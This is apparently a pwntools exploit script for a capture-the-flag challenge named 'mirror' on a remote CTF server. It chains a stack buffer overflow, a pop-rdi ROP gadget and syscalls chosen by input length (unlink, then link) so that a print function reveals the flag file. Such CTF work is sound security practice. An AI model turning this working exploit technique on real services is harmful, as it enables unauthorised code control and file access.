from pwn import *

p = remote("ctf.infinitylabs.co.il", 1232)
local = process("./mirror")
e = ELF("./mirror")

payload1 = b'B'*16  #offset to the return address
payload2 = b'A'*22
more_junk = b'A'*24

_start_address = p64(e.symbols.mirror) #address of mirror (where the server wait for our input)
print_flag_address = p64(e.symbols.print_flag)
pop_address = p64(0x40102a) #pop rdi instruction in mirror function
false_flag =  p64(0x402000)
flag =        p64(0x402006)

final_payload = payload1 + pop_address + false_flag + more_junk + _start_address + payload2 #payload1 is 16 bytes to get to the return address of mirror, then we overide the return address of mirror with the address of the pop instruction in mirror,then we put false_flag so the pop will pop it to rdi register, and the syscall to unlink (syscall 87 which is the number of bytes in our input)will delete it. after that we put more junk to get to the offset of the return address and we put the start address there so we can have a chance to send another paload of size 86 and call link syscall.  
log.info(f"final payload is: {final_payload}")

#gdb.attach(p)
p.sendline(final_payload)
print(p.recv())

# local.sendline(final_payload)
# print(local.recv())

payload2 = b'A'*21
more_junk = b'A'*16

final_payload = payload1 + pop_address + flag + false_flag + more_junk + print_flag_address + payload2 #here we put 86 byte payload because we want to call link syscall which is number 86, and we make a soft link to flag which we name false_flag, and we call call print_flag to print false_flag which will print the flag file.

# local.sendline(final_payload)
# print(local.recv())

p.sendline(final_payload)
print(p.recvline())
print(p.recvline())
print(p.recvline())
#p.interactive()









